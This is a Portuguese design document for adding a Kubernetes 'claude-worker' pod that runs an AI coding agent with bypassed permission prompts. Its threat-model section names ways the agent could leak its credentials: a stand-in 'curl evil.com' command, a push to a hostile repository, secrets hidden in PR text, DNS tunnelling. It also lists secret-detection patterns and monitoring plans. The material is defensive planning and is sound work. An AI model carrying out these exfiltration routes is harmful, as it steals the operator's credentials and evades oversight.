# claude-worker — Design (issue #309 completion)

> **Status**: Design aprovado em brainstorming · pendente de revisão final do operador antes de invocar writing-plans.
> **Issue alvo**: [#309](https://github.com/elimarcavalli/deile/issues/309) — `[INTENT] O DEILE deve ser capaz de despachar CLAUDEs -p dentro do container além de DEILEs`
> **PR antecessor (incompleto)**: [#330](https://github.com/elimarcavalli/deile/pull/330) — entregou apenas o toggle UI global (parte 3 do intent). Faltam infra K8s + per-stage matrix.

## 1. Motivação

A intent original da #309 tem **três pontas**:

1. ✅ "Deve ser configurável de alguma forma no painel de deploy" → entregue pela PR #330 (hotkey `[d]`, `DispatchModeView`).
2. ❌ "Precisa funcionar dentro do k8s" → **NÃO** entregue. `infra/k8s/Dockerfile` não instala `claude` CLI; pipeline pod não tem credentials.
3. ❌ "Precisa funcionar disparar CLAUDE com conta logada (Pro/Max)" → **NÃO** entregue.

Esta spec fecha as partes 2+3 e, no caminho, **expande** o intent original com:

- Per-stage dispatcher (espelha per-stage models do #305 / decisão #41) — você configura qual worker (DEILE ou claude) executa cada stage do pipeline.
- View unificada `[d]` (Worker + Model por stage) — substitui o `[d]` global + `[M]` per-stage do estado atual.
- Install-on-the-fly do claude-worker (panel detecta ausência, oferece bootstrap completo sem sair do TUI).
- Switch-account (re-login com OAuth) tanto via CLI (`deploy.py k8s claude-login --switch`) quanto pelo painel.

## 2. Decisões capturadas no grilling

| # | Dimensão | Decisão | Alternativas rejeitadas |
|---|---|---|---|
| 1 | Onde claude -p roda | Pod **novo `claude-worker`** paralelo ao deile-worker, HTTP :8767, mesmo image. | (a) In-process no deile-pipeline (fat pod, perde isolamento). (b) deile-worker gordo (quebra SRP). |
| 2 | Credentials | `deploy.py k8s claude-login` lê `~/.claude/credentials.json` do host → Secret → initContainer copia pra PVC writable em `/home/claude/.claude/` → claude CLI in-pod refresha próprio até refresh_token morrer. | (a) ANTHROPIC_API_KEY direta (perde subscription). (b) OAuth in-pod via port-forward (complexo; vira FU). |
| 3 | Image | Bake `claude` CLI numa nova camada do `deile-stack:local` (`RUN npm install -g @anthropic-ai/claude-code`). Cresce ~120MB. | (a) Image separado (drift). (b) Build-arg opcional (complexidade extra). |
| 4 | Install timing | Bake no build. **No deploy zerado, claude-worker NÃO é aplicado** — só sobe quando rodar `claude-login`. | (a) Always-on (replicas=1 always, ocioso ~200MB RAM). (b) initContainer instala em runtime (precisa abrir egress npm; reinstala a cada restart). |
| 5 | Per-stage paradigm | Cada stage tem dispatcher independente (espelhando per-stage models). Stages: classify, refine, implement, pr_review, follow_ups. | (a) Global flip apenas (rejeitado pelo user). |
| 6 | Mismatch (model × worker) | Picker do modelo **restringido pelo worker** da linha: `claude-worker` → só `anthropic:*`; `deile-worker` → todos. | (a) Validação só on-save. (b) Fallback silencioso. (c) Falha runtime. |
| 7 | UX painel | View **unificada** sob `[d]`: matriz N+1 linhas × 2 colunas (Worker + Model). `[M]` removido. `[m]` runtime model permanece. | (a) `[d]/[D]` simétrico ao `[m]/[M]`. (b) Single key com tabs internas. |
| 8 | Failover | Reusa **retry/escalação existentes** do pipeline (5xx/timeout → `~workflow:em_implementacao` retry, persiste → `~workflow:bloqueada`). | (a) Auto-fallback pro outro worker. (b) Fail-fast. (c) Healthcheck pre-dispatch. |
| 9 | Default state | claude-worker **não existe** no cluster ao `k8s up`. Subida acontece via `claude-login` (CLI ou panel). | (a) Always-on. (b) Prompt interativo no `k8s up`. |
| 10 | Phasing | **PR único, escopo completo**. ~2500-3500 LoC. | (a) 2 PRs (infra + matrix). (b) 3 PRs gradual. |

**Extra capturado mid-design**:
- Switch-account: panel mostra a conta ativa + ação `[L] Trocar conta` que invoca `claude logout` + `claude login` + re-bootstrap.
- Install-on-the-fly: ao tentar selecionar `claude-worker` no picker quando o Deployment não está aplicado, modal `[Y/N] Instalar agora?` invoca o mesmo helper interno do `claude-login` verb.

## 3. Arquitetura

```
┌─────────────────────────────────────────────────────────────────────┐
│                          deile-pipeline                              │
│  (monitor + briefs + per-stage routing)                              │
│                                                                       │
│  dispatch_resolver.resolve_stage_dispatcher(stage) → str             │
│  model_resolver.resolve_stage_model(stage) → str                     │
│                              │                                       │
│           ┌──────────────────┴───────────────────┐                   │
│           ▼                                      ▼                   │
└──────────HTTP─────────────────────────────────HTTP──────────────────┘
           :8766                                   :8767
           ▼                                       ▼
┌─────────────────────┐                ┌─────────────────────────────┐
│   deile-worker      │                │   claude-worker  (NEW)      │
│  (existente)         │                │                             │
│  replicas: 2        │                │   replicas: 1               │
│  python wrapper.py  │                │   python wrapper.py claude  │
│  └─ DeileAgent      │                │   └─ claude -p --model X    │
│                     │                │       em worktree isolado   │
│  PVC: deile-worker- │                │   PVC: claude-worker-home   │
│        work         │                │   Secret: claude-credentials│
│  Secret: deile-     │                │       (initContainer copia  │
│          secrets    │                │        pra ~/.claude/       │
│          worker-    │                │        writable PVC)        │
│          bearer     │                │   Secret: claude-worker-    │
│                     │                │           bearer (novo)     │
└─────────────────────┘                └─────────────────────────────┘
```

### 3.1 Mudanças no repo (alto nível)

| Arquivo | Tipo |
|---|---|
| `infra/k8s/Dockerfile` | UPDATE — nova camada `RUN npm install -g @anthropic-ai/claude-code` |
| `infra/k8s/manifests/48-claude-worker-bearer-secret.yaml` | NEW — template (deploy.py popula token) |
| `infra/k8s/manifests/49-claude-worker-pvc.yaml` | NEW — 1Gi RWO |
| `infra/k8s/manifests/50-claude-worker-deployment.yaml` | NEW — Deployment + Service |
| `infra/k8s/manifests/40-network-policy.yaml` | UPDATE — pipeline → claude-worker:8767; claude-worker egress: `api.anthropic.com:443` + `github.com:443` (whitelisted repos) + `gitlab.com:443` (whitelisted projects). Whitelist em ConfigMap `claude-worker-allowed-repos`; wrapper.py valida URL contra regex antes de exec do claude (defesa em profundidade). |
| `infra/k8s/manifests/47-claude-worker-allowed-repos.yaml` | NEW — ConfigMap com regex de URLs permitidas para git push/clone (defaults: `^https://github\.com/elimarcavalli/(deile\|deilebot)(\.git)?$`) |
| `infra/k8s/wrapper.py` | UPDATE — novo arg `claude-worker` (dispatcha pra claude_worker_server) |
| `infra/k8s/claude_worker_server.py` | NEW — aiohttp listener /v1/dispatch + /v1/health + /v1/progress |
| `infra/k8s/_claude_install.py` | NEW — `bootstrap_claude_worker()` (chamado por CLI e por painel) |
| `infra/k8s/deploy.py` | UPDATE — novo verb `k8s claude-login [--switch] [--no-interactive]` |
| `infra/k8s/_panel.py` | UPDATE — `DispatchMatrixView` substitui `DispatchModeView` + `StageModelsView`; binding `[d]` mantém, `[M]` é removido |
| `infra/k8s/_panel_data.py` | UPDATE — `StageDispatchProvider` novo (consolida providers) |
| `deile/orchestration/pipeline/dispatch_resolver.py` | NEW — espelha `model_resolver.py` |
| `deile/orchestration/pipeline/implementer.py` | UPDATE — `WorkerImplementer` ganha parâmetro `endpoint`; `build_implementer` resolve via `dispatch_resolver` |
| `deile/orchestration/pipeline/payloads.py` | UPDATE — `DispatchPayload` ganha campos `stage`, `action_kind`, `issue_number`, `branch` |
| `deile/config/settings.py` | UPDATE — schema novo `pipeline.dispatchers.<stage>` |

### 3.2 Validações cross-cutting

- claude-worker **REJEITA** dispatches com `preferred_model` não-`anthropic:*` (HTTP 400). Mensagem clara para audit.
- Painel **RESTRINGE** o model picker quando o worker da linha é `claude-worker` (só mostra anthropic:*).
- `dispatch_resolver` **VALIDA** `stage in PIPELINE_STAGES`; valor inválido → `ValueError` (programming bug, não user input).
- Secret `claude-credentials` **REQUER** modo 0o400; initContainer copia pra PVC writable mas mantém 0o600 lá.

## 4. Component breakdown

### 4.1 `dispatch_resolver` (deile/orchestration/pipeline/)

```python
PIPELINE_STAGES = ("classify", "refine", "implement", "pr_review", "follow_ups")
VALID_DISPATCHERS = frozenset({"deile-worker", "claude-worker"})

def resolve_stage_dispatcher(stage: str) -> str:
    """Fallback chain (top → bottom):
      1. DEILE_PIPELINE_DISPATCH_<STAGE>     (env var per-stage)
      2. DEILE_PIPELINE_DISPATCH_MODE        (env var global, da PR #330)
      3. "deile-worker"                       (built-in default)
    """

def get_endpoint_for(dispatcher: str) -> str:
    """deile-worker → DEILE_WORKER_ENDPOINT env (http://deile-worker:8766)
       claude-worker → DEILE_CLAUDE_WORKER_ENDPOINT env (http://claude-worker:8767)
    """

def is_valid_dispatcher(value: str) -> bool: ...
```

Testes: `test_dispatch_resolver.py` espelha o pattern do `test_model_resolver.py` (env precedence, raise em valor inválido, defaults).

### 4.2 `WorkerImplementer` (atualização)

```python
class WorkerImplementer(PipelineImplementer):
    def __init__(
        self, *,
        client=None,
        endpoint_override: Optional[str] = None,  # NEW — se setado, pula resolve por stage
    ):
        self._endpoint_override = endpoint_override
        ...

    async def implement(self, monitor, issue, *, resume=False):
        endpoint = self._endpoint_override or get_endpoint_for(
            resolve_stage_dispatcher("implement")
        )
        # POST endpoint/v1/dispatch ... (existing logic)
```

`build_implementer(dispatch_mode)` simplifica:
- Sempre retorna `WorkerImplementer()` sem override.
- O dispatch_mode global vira só o fallback no resolver.
- Mantém `ClaudeImplementer` legacy para uso CLI local (fora do cluster).

### 4.3 `DispatchPayload` (atualização)

```python
@dataclass
class DispatchPayload:
    brief: str
    channel_id: str
    preferred_model: str | None = None
    # NEW fields:
    stage: str | None = None              # classify | refine | implement | pr_review | follow_ups
    action_kind: str | None = None        # implement | review | mention | refine | decompose | ...
    issue_number: int | None = None
    branch: str | None = None
```

**Compatibilidade**: campos novos opcionais; deile-worker existing handler aceita e ignora se não precisa. claude-worker handler usa para preamble.

### 4.4 `claude_worker_server.py` (NEW)

```python
# Espelha worker_server.py existing, adapta para subprocess `claude -p`:
async def dispatch_handler(request):
    payload = await request.json()
    # 1. Validate model is anthropic:*
    # 2. Translate slug (anthropic:claude-opus-4-7 → claude-opus-4-7)
    # 3. Prepare worktree (clone + checkout branch)
    # 4. Build full prompt: preamble[stage] + "---" + brief
    # 5. exec `claude -p --permission-mode bypassPermissions [--model X] <prompt>`
    # 6. Capture stdout/stderr, return JSON (mesmo shape do deile-worker)

async def progress_handler(request):
    # GET /v1/progress/{task_id} — snapshot mid-flight do subprocess
    # tail dos logs da task

async def health_handler(request):
    # GET /v1/health — readiness/liveness probe target
    # verifica: claude binary acessível? credentials lidas?
```

### 4.5 `_claude_install.py` (NEW)

Compartilhado entre CLI verb e painel:

```python
@dataclass
class ClaudeLoginResult:
    ok: bool
    account_email: str | None
    secret_applied: bool
    deployment_applied: bool
    rollout_ready: bool
    error: str | None

def bootstrap_claude_worker(
    *,
    namespace: str = "deile",
    force_relogin: bool = False,
    interactive: bool = True,
    logger: Logger | None = None,
) -> ClaudeLoginResult:
    # 1. Detect/relogin credentials (claude logout + claude login se necessário)
    # 2. Read credentials.json + extract email
    # 3. Apply Secret claude-credentials
    # 4. Apply manifests/49 + /50
    # 5. Wait rollout status
    # 6. Probe healthcheck via Service
    # 7. Return ClaudeLoginResult
```

### 4.6 `DispatchMatrixView` (panel)

- Substitui `DispatchModeView` (PR #330) + `StageModelsView` (#305).
- Layout: 5 linhas de stage + 1 de "Global default" + 1 de "claude-worker status" no header.
- Worker picker: opções restringidas; mostra modal install se claude-worker não aplicado.
- Model picker: contextual ao Worker.
- Actions:
  - `↑↓ ←→` navegação
  - `[enter]` editar célula
  - `[r]` reset célula (delete env var)
  - `[L]` trocar conta claude-worker (visível só quando claude-worker aplicado)
  - `[q]` back

## 5. Data flow

### 5.1 Pipeline dispatch para stage `implement`

```
PipelineMonitor (deile-pipeline pod)
    │
    │ async issue picked: #N "feature X"
    ▼
WorkerImplementer.implement(monitor, issue)
    │
    │ stage = "implement"
    │ dispatcher = resolve_stage_dispatcher("implement")
    │            = "claude-worker"  (env var DEILE_PIPELINE_DISPATCH_IMPLEMENT)
    │
    │ model = resolve_stage_model("implement")
    │       = "anthropic:claude-opus-4-7"  (env var DEILE_PIPELINE_MODEL_IMPLEMENT)
    │
    │ endpoint = get_endpoint_for("claude-worker")
    │          = "http://claude-worker:8767"
    │
    │ brief = render_worker_implement_brief(issue, ...)
    │
    ▼ POST http://claude-worker:8767/v1/dispatch
       {
         brief: "<long brief from briefs.py>",
         channel_id: "auto/issue-N",
         preferred_model: "anthropic:claude-opus-4-7",
         stage: "implement",
         action_kind: "implement",
         issue_number: N,
         branch: "auto/issue-N"
       }
    │
claude-worker dispatch_handler:
    │
    │ 1. validate model is anthropic:*  ✓
    │ 2. claude_model = "claude-opus-4-7"
    │ 3. workspace = /home/claude/work/<task_id> (git checkout branch)
    │ 4. preamble = render_claude_preamble("implement", branch, task_id)
    │ 5. full_prompt = preamble + "\n---\n" + brief
    │ 6. cmd = ["claude", "-p", "--model", "claude-opus-4-7",
    │           "--permission-mode", "bypassPermissions", full_prompt]
    │ 7. subprocess in cwd=workspace
    │
    │ ... claude trabalha (5-90 min) ...
    │
    │ stdout/stderr capturado em arquivo + memory tail
    │
    ▼ HTTP response:
       {
         ok: true,
         stdout: "<last 50KB>",
         stderr: "<last 10KB>",
         task_id: "abc12345",
         duration_seconds: 4231
       }
    │
WorkerImplementer.implement → WorkOutcome(ok=True, text=..., error=...)
    │
PipelineMonitor: usa text/error pra parse, decide próximo passo (open PR → review etc).
```

### 5.2 claude-login flow

```
Operator                  Host                    Cluster
    │
    │ python3 deploy.py k8s claude-login --switch
    │                       │
    │                       ├─ claude logout
    │                       ├─ claude login → spawn browser → OAuth → ~/.claude/credentials.json escrito
    │                       │
    │                       ├─ read credentials.json (extract email)
    │                       │
    │                       ├─ kubectl apply Secret claude-credentials ──────────► Secret claude-credentials
    │                       │
    │                       ├─ kubectl apply manifests/49 + /50 ─────────────────► PVC + Deployment + Service
    │                       │
    │                       ├─ kubectl rollout status deploy/claude-worker
    │                       │   (initContainer copia Secret → PVC ~/.claude/)
    │                       │
    │                       ├─ kubectl exec deile-shell -- curl http://claude-worker:8767/v1/health
    │                       │
    │ ✓ "claude-worker pronto, logado como user@example.com"
    │
```

## 6. Persistência

**Cluster** (panel grava, pipeline lê):
- `DEILE_PIPELINE_DISPATCH_CLASSIFY` = `deile-worker | claude-worker | (vazio)`
- `DEILE_PIPELINE_DISPATCH_REFINE` = idem
- `DEILE_PIPELINE_DISPATCH_IMPLEMENT` = idem
- `DEILE_PIPELINE_DISPATCH_PR_REVIEW` = idem
- `DEILE_PIPELINE_DISPATCH_FOLLOW_UPS` = idem
- `DEILE_PIPELINE_DISPATCH_MODE` = global default (já existe da PR #330)
- `DEILE_PIPELINE_MODEL_<STAGE>` = (já existe da #305)
- `DEILE_PIPELINE_MODEL` = global default model

Set via `kubectl set env deploy/deile-pipeline DEILE_PIPELINE_DISPATCH_<STAGE>=<value> -n <ns>`. Painel + audit.

**CLI local** (`~/.deile/settings.json`):
```json
{
  "pipeline": {
    "dispatch_mode": "deile-worker",
    "dispatchers": {
      "classify": "deile-worker",
      "implement": "claude-worker",
      ...
    },
    "models": { ... }
  }
}
```

Validação no schema (`Settings`): valores devem estar em `VALID_DISPATCHERS`.

## 7. Threat model & credential security

> Atualizado pós-grilling (operador identificou gap de exfiltração via prompt-injection). Esta seção documenta explicitamente o que V1 mitiga vs aceita como risco residual.

### 7.1 Modelo de ameaça

| Vetor | Defesa V1 | Status |
|---|---|---|
| deile-worker tenta ler credenciais do claude-worker | Pods isolados, PVCs separados, NetworkPolicy default-deny entre pods, Secret não montado em deile-worker | ✅ Bloqueado por isolation |
| deile-pipeline tenta ler credenciais | Idem | ✅ Bloqueado |
| Operador externo via kubectl exec (kubectl access compromise) | Padrão K8s (RBAC + audit) — fora do escopo desta feature | ✅ Cluster-level |
| claude-worker exfiltra próprias credenciais via `curl evil.com` | NetworkPolicy egress restrito a `api.anthropic.com:443`, `github.com:443`, `gitlab.com:443` | ✅ L3/L4 block |
| **claude-worker exfiltra via `git push owner-malicioso/leak`** | **NetworkPolicy egress refinada**: claude-worker só pode push pra repos whitelisted (`elimarcavalli/deile`, `elimarcavalli/deilebot`) | ✅ Mitigado V1 (nova) |
| claude-worker insere credentials em PR body / commit message do PR legítimo | Audit logging do /v1/dispatch response: log integral do stdout/stderr; alert em padrões `sk-ant-`, `oauth_token`, `eyJ...` (JWT) | ✅ Detecção pós-fato |
| claude-worker exfiltra via response do /v1/dispatch (vai pra logs do pipeline) | Mesmo audit + alert pattern | ✅ Detecção pós-fato |
| DNS tunneling / smuggling de bytes em headers HTTP legítimos | NetworkPolicy é L3/L4 só | ⚠️ **Risco residual aceito V1** |
| Refresh do OAuth token via `claude` CLI durante runtime — credentials atualizadas no PVC | claude CLI writes back to /home/claude/.claude/ (writable subpath); processo legítimo | ✅ Esperado |

### 7.2 Mitigações ativas no V1

1. **PVC mode 0600**: credentials.json owned by uid 10001, only claude-runner can read.
2. **NetworkPolicy egress whitelisted**: claude-worker → api.anthropic.com:443 + github.com:443 (filtered) + gitlab.com:443 (filtered).
3. **Repo whitelist no NetworkPolicy**: aproveita IPSet/DNS filtering quando disponível; fallback é ConfigMap `claude-worker-allowed-repos` com regex de URL validada por wrapper.py antes de exec do claude.
4. **Audit `IMPLEMENTATION_RESULT_CAPTURED`** em todo response do /v1/dispatch: log integral salvo em PVC + grep pattern de detecção (`sk-`, `oauth_token`, longas strings base64).
5. **readOnlyRootFilesystem + drop ALL caps**: pod não pode escrever fora dos volumes declarados.

### 7.3 Riscos residuais aceitos V1

- **DNS tunneling / data smuggling em headers legítimos** — não mitigado a nível de NetworkPolicy. Mitigação real exige sidecar credential proxy (FU #N+3).
- **Credenciais reside em arquivo dentro do pod** — gap fundamental do design V1; única solução real é sidecar pattern com auth-proxy (FU dedicada).
- **Self-leak via PR body / commit message** — detectado mas não prevenido. Operador precisa monitorar logs/audit.

### 7.4 Trajetória de hardening (não V1)

- **V2**: Sidecar credential proxy (FU dedicada) — claude-runner sem credentials.json no FS; auth-sidecar mints short-lived bearer tokens.
- **V3**: Vault integration (FU dedicada) — auth-sidecar puxa de Vault em vez de Secret estático, com rotação automática.
- **V4**: Behavioral detection — eBPF tracing de syscalls do claude-runner; alert em `open("/home/claude/.claude/credentials.json")` por processo NÃO sendo o próprio claude.

## 8. Failure handling

Reusa caminhos existentes do pipeline (decisão 8 do grilling):

| Cenário | Comportamento |
|---|---|
| claude-worker HTTP 503 / connection refused | Task fica em `~workflow:em_implementacao`, retry no próximo tick do pipeline. |
| claude-worker timeout (>1800s default) | Mesmo: retry; após N consecutivas, escala pra `~workflow:bloqueada`. |
| claude-worker HTTP 400 (bad model, bad request) | Audit `IMPLEMENTATION_REJECTED`; task vai pra `~workflow:bloqueada` direto (não é transitório). |
| claude CLI ENOENT no pod | Pod readiness probe falha; readness=false → tasks não despachadas. Operator vê via panel "claude-worker not ready". |
| Secret claude-credentials inválido (token expired) | claude CLI in-pod retorna auth error; dispatch retorna stdout/stderr com mensagem clara. Operator roda `claude-login --switch`. |

Audit logging: todas as transições passam por `AuditEvent` tipado (`AuditEventType.SECURITY_POLICY_CHANGED` para panel changes; `IMPLEMENTATION_REJECTED` / `IMPLEMENTATION_FAILED` para runtime failures).

## 9. Test plan

### Unit (~15 testes)
- `deile/tests/orchestration/test_dispatch_resolver.py` — env precedence, ValueError em invalid stage, get_endpoint_for mapping.
- `deile/tests/orchestration/test_dispatch_payload_extended.py` — DispatchPayload aceita campos novos opcionais; backward-compat com payloads antigos.
- `deile/tests/orchestration/test_worker_implementer_routing.py` — `WorkerImplementer.implement(stage="implement")` resolve endpoint correto; honra `endpoint_override`.
- `deile/tests/infra/test_dispatch_matrix_view.py` — picker contextual (worker→model), reset, audit, modal install-on-the-fly.
- `deile/tests/infra/test_claude_install.py` — `bootstrap_claude_worker` idempotência, force_relogin path, falha gracefully sem cluster.

### Integration (~5 testes)
- `deile/tests/infrastructure/test_claude_worker_server.py` — mock subprocess; valida response shape no contrato; 400 em model inválido; timeout handler.
- `deile/tests/infrastructure/test_pipeline_dispatches_claude.py` — pipeline fake config → dispatcher claude-worker → mock HTTP retorna; verifica payload shape.

### Smoke (1 manual em `deile/tests/might/`)
- `test_claude_dispatch_real.py` — requer cluster vivo + claude-login feito; faz dispatch real, verifica que arquivo foi modificado no PVC do claude-worker. Não roda em CI.

### Não testado (explícito)
- Browser OAuth real (manual).
- Refresh de token via claude CLI in-pod (depende de Anthropic).

## 10. Follow-up issues a criar pós-merge

> **Pri 1 (HARDENING DE SEGURANÇA)** — Recomendado abrir junto com a #309 fase 2 para fechar gap conhecido:

1. **[INTENT] Sidecar credential proxy para claude-worker** (#TBD, prioridade alta) — Fechar gap de auto-exfiltração documentado em [seção 7.3](#73-riscos-residuais-aceitos-v1). Adiciona container `auth-sidecar` no claude-worker pod que holds credentials e minta short-lived bearer tokens via HTTP localhost:9999. claude-runner roda sem credentials.json no FS. Estimativa: 1500 LoC + wrapper customizado do claude CLI.

2. **[INTENT] Vault integration com Anthropic OAuth secret engine** (#TBD, prioridade média) — Substitui Secret estático por Vault Agent Injector. Requer secret engine custom pra Anthropic OAuth (rotação de refresh_token). Pre-req: sidecar proxy (#1 acima). Estimativa: 800 LoC + Vault deployment manifest.

> **Pri 2 (NICE-TO-HAVE)**:

3. **[FEATURE] `[d]` view: colunas avançadas por stage (timeout, retries, cost cap)** — já criada como #334. Espelha solicitação explícita do user durante o grilling. Não é pre-req da #309.

4. **[FEATURE] OAuth in-pod via port-forward para claude-login zero-touch** — já criada como #335. Habilita instalar claude-worker em cluster sem ter claude CLI no host. Boa pra Rancher remoto / CI.

5. **[FEATURE] claude-worker scale-up com RWX PVC** — multiple replicas. Hoje single-replica é gargalo se você dispatcha 3+ tasks paralelas pra claude.

6. **[FEATURE] OTLP tracing no claude-worker** — span por dispatch, atributos task_id/duration/model/stage. Espelha #303 fase 4.

7. **[FEATURE] Múltiplos perfis claude (contas diferentes por stage)** — hoje single account. Útil se você quer uma conta pra implement e outra pra review.

8. **[FEATURE] Behavioral detection de credential access via eBPF** — alerta em syscalls que tentem ler `/home/claude/.claude/credentials.json` por processo que NÃO é o próprio claude-runner. Camada extra de defesa-em-profundidade pós-sidecar.

## 11. Out of scope explicit

- Suporte a `claude -p` em ambientes sem Anthropic OAuth (ex: enterprise Claude via API key dedicada).
- A/B testing automático entre deile-worker e claude-worker numa mesma stage.
- Mecanismo de auto-bidding/load-balancing entre engines.
- Migração automática de dispatches em vôo quando user flipa worker (mid-task switch).
- ~~Integração com Vault para Secret storage~~ — **MOVIDO** para FU #2 da seção 10 (recomendado abrir junto com #309).
- Sidecar credential proxy — **MOVIDO** para FU #1 da seção 10 (recomendado abrir junto com #309).

## 12. Risks identified

| Risco | Mitigação |
|---|---|
| Image cresce ~120MB e quebra layer cache | Camada do claude CLI fica depois das outras (gh/glab), preservando cache em rebuilds que não tocam isso. Smoke `claude --version` no build catch installs quebrados. |
| Browser OAuth durante `claude-login` fora do TUI confunde operador | Modal do painel mostra mensagem clara "abrindo browser, complete o login, vou aguardar"; timeout sane (5min). |
| Refresh de token falha silenciosamente (claude CLI dentro do pod não consegue refresh) | Healthcheck `/v1/health` testa `claude api ping` (light call); se falha, pod fica unready, painel mostra status. Operator vê e roda `claude-login --switch`. |
| Pipeline + claude-worker em ciclos infinitos (claude retorna erro, pipeline retry, claude erro de novo) | Reusa o teto de tentativas existente do pipeline (`MAX_RETRIES`); após N falhas, `~workflow:bloqueada`. |
| Operador esquece de fazer claude-login e dispatcha stage pra claude-worker | Modal install-on-the-fly no panel previne. CLI verb também valida antes de aceitar settings.json com dispatcher=claude-worker. |

## 13. Open questions (resolver durante implementação)

- Nome exato do verb: `k8s claude-login` ou `k8s claude-setup`? **Decisão**: `claude-login` (matches o `gh auth login` / `gcloud auth login` mental model).
- Porta do claude-worker: 8767 (mirror 8766+1) é arbitrária. **Decisão**: 8767, mas configurável via env var como deile-worker.
- claude-worker timeout default: 1800s (30min). **Decisão**: alinhado com expectativa "claude pode levar tempo"; per-stage override fica como FU.
- Logs do claude-worker: stdout/stderr persistem em PVC, ou só em memória? **Decisão**: stdout/stderr salvos em `/home/claude/work/<task_id>/{stdout,stderr}.log` no PVC para `/v1/progress/{task_id}` poder ler. Cleanup após task complete (TTL 24h via cron interno do claude_worker_server).
